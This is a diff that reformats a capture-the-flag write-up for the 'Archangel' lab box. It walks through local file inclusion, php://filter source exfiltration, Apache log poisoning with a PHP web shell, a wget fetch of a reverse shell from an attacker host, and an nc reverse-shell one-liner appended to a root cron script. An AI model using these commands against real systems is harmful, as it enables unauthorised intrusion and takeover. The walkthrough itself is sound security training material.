@@ -7,7 +7,9 @@ Let's begin by exporting the IP in the environment variable as 'target':
 
 
 And by scanning with nmap:
-`nmap -sC -sV $target`
+```
+nmap -sC -sV $target
+```
 ![](https://github.com/user-attachments/assets/cc8e76a2-45e9-4a85-8188-c42806d4c40c)
 
 
@@ -16,7 +18,9 @@ Let's browse the IP:
 ![](https://github.com/user-attachments/assets/9471f3cf-a7b4-4083-b383-7dbe2d2bfa6e)
 
 As we can see, there's a hint for a "mafialive.thm" domain, so let's add this domain to the `/etc/hosts` file:
-`sudo nano /etc/hosts`
+```
+sudo nano /etc/hosts
+```
 ![](https://github.com/user-attachments/assets/fd8c6508-2849-4b47-bde2-252251bac54c)
 
 
@@ -30,7 +34,9 @@ Now we can browse by typing the domain in the search bar and catch the first fla
 
 
 Next step is fuzzing the app, we will use ffuf for this:
-`ffuf -u "http://mafialive.thm/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php -c -t 50 -r`
+```
+ffuf -u "http://mafialive.thm/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php -c -t 50 -r
+```
 ![](https://github.com/user-attachments/assets/9afaaa9e-c40c-45d1-87eb-61a15c71be68)
 
 
@@ -49,7 +55,9 @@ Now we're in `http://mafialive.thm/test.php?view=/var/www/html/development_testi
 
 
 Let's try a php filter to exfiltrate data:
-`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
+```
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
+```
 ![](https://github.com/user-attachments/assets/e75944cf-5cdb-4f47-a885-cd450a3b8f94)
 Now we have the phrase "Control is an illusion" written in base64.
 
@@ -57,7 +65,9 @@ Now we have the phrase "Control is an illusion" written in base64.
 
 
 Let's do it with the entire test.php page:
-`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
+```
+http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+```
 ![](https://github.com/user-attachments/assets/610df6ee-0757-4ce7-944c-fcbc48672fb8)
 
 
@@ -68,32 +78,44 @@ And decode the exfiltrated data to find the second flag:
 
 
 Let's fuzz for LFI:
-`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r`
+```
+ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r
+```
 
 Only to find out many false positives.
 
 Let's try filtering through size and words:
-`ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41`
+```
+ffuf -u "http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -c -t 50 -r -fs 286 -fw 41
+```
 ![](https://github.com/user-attachments/assets/fe5dd264-9e58-4be5-8d52-8f9daa0ddc83)
 We've succesfully exploited LFI. Let's inject the code in the URL to exfiltrate `/etc/passwd`
 
-`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd`
+```
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd
+```
 ![](https://github.com/user-attachments/assets/6cbed028-1065-4057-96f3-e2ff9b687c1d)
 
 
 Now, given the LFI vulnerability, if we can successfully access the log, we can poison it (log poisoning) to insert our php shell:
-`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log`
+```
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log
+```
 ![](https://github.com/user-attachments/assets/729eeef7-165f-4afe-94bd-ca6533cbd20b)
 
 
 
 Now it's time to fire up BurpSuite.
 We'll put the php web shell in the User-Agent string:
-`<?php echo system($_GET['cmd']); ?>`
+```
+<?php echo system($_GET['cmd']); ?>
+```
 ![](https://github.com/user-attachments/assets/2cf45042-de12-4575-aba6-f3416c552bbc)
 
 And we'll try if it's working by injecting `&cmd=whoami` in the URL:
-`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami`
+```
+http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&cmd=whoami
+```
 
 Now we have code execution.
 
@@ -102,7 +124,9 @@ We can use it to upload a php reverse shell (Pentestmonkey's php reverse shell n
 
 
 Don't forget to URL encode the space (%20)
-`GET test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&wget%20http://xx.xx.xx.xx:8888/shell.php`
+```
+GET test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&wget%20http://xx.xx.xx.xx:8888/shell.php
+```
 
 ![](https://github.com/user-attachments/assets/9d29b928-f84a-4f22-8ef5-000ec4634757)
 
@@ -112,13 +136,16 @@ It's time to fire up netcat and visit `mafialive.thm/shell.php` to trigger the s
 ![](https://github.com/user-attachments/assets/73bd663a-6950-40c9-aa21-590e9f6c3166)
 
 And...we're in!
-`whoami:` 
-`www-data`
-
+```
+whoami: 
+www-data
+```
 
 Let's stabilize the shell:
-`python3 -c 'import pty;pty.spawn("/bin/bash")'`
-`export TERM=xterm-color`
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm-color
+```
 ![](https://github.com/user-attachments/assets/0eaeae04-1ab0-4ddb-8edc-49a11dbf3061)
 
 Now we're ready to search for the third flag, the one of the first user (www-data).
@@ -126,7 +153,9 @@ Now we're ready to search for the third flag, the one of the first user (www-dat
 
 
 Let's do some cron enumeration:
-` cat /etc/crontab`
+```
+cat /etc/crontab
+```
 ![](https://github.com/user-attachments/assets/15739c46-68df-46d2-ae9e-fa7927e3652f)
 
 We can see that there's a helloworld.sh file that's been executed every minute as user 'archangel'.
@@ -136,7 +165,9 @@ If we `ls -la` the file we can see we have write permission on it.
 
 
 We will echo this one liner into the file and wait for the execution by root:
-`echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.xx.xx.xx 4445 >/tmp/f" >> helloworld.sh`
+```
+echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc xx.xx.xx.xx 4445 >/tmp/f" >> helloworld.sh
+```
 (Activate netcat in another terminal on port 4445)
 And obviously, we will stabilize the shell again and search for the flag of the user archangel.
 ![](https://github.com/user-attachments/assets/f8ad5060-bc0f-4ff5-9262-a05c0ac7ebfa)
@@ -147,7 +178,7 @@ In the same folder of the flag, we can find a file named `backup` owned by root 
 What we need to do is to create another `cp` file with just `/bin/bash` on it and write into the `$PATH` environment variable the new path of our `cp` file.
 The command to elencate the full path of the OS is `echo $PATH`
 
-```bash
+```
 echo $PATH:
 /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
